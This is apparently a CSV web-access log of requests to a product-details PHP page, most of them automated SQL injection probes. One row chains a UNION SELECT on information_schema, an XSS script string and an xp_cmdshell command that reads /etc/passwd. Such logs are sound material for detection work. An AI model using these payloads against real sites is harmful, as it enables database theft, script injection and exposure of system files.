full_url,event_time,hostname
/details.php?pr	od=5&type=2,1680093070.911037,10.0.2.32
/details.php?pr	od=5&type=2,1680093070.911037,10.0.2.31
/details.php?prod=5&type=2&OUOT=7916%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,1680093072.451418,10.0.2.31
/details.php?prod=5&type=2,1680093072.500793,10.0.2.31
/details.php?prod=3196&type=2,1680093072.547299,10.0.2.31
/details.php?prod=5.%28%2C%2C%2C%27%28%22%28%2C&type=2,1680093072.579581,10.0.2.31
/details.php?prod=5%27DGsZuv%3C%27%22%3EvASviJ&type=2,1680093072.596299,10.0.2.31
/details.php?prod=5%29%20AND%202119%3D1319%20AND%20%286016%3D6016&type=2,1680093074.578803,10.0.2.31
/details.php?prod=5%29%20AND%202242%3D2242%20AND%20%287595%3D7595&type=2,1680093074.604683,10.0.2.31
/details.php?prod=5%29%29%20AND%209477%3D1460%20AND%20%28%284897%3D4897&type=2,1680093074.62256,10.0.2.31
/details.php?prod=5%29%29%20AND%202242%3D2242%20AND%20%28%287188%3D7188&type=2,1680093074.64507,10.0.2.31
/details.php?prod=5%20AND%209513%3D5835&type=2,1680093074.649396,10.0.2.31
/details.php?prod=5%20AND%202242%3D2242&type=2,1680093074.653963,10.0.2.31
/details.php?prod=5%20AND%207784%3D5336&type=2,1680093074.658885,10.0.2.31
/details.php?prod=%28SELECT%20CONCAT%28CONCAT%280x7176787171%2C%28CASE%20WHEN%20%283069%3D3069%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x7178706a71%29%29&type=2,1680093074.664277,10.0.2.31
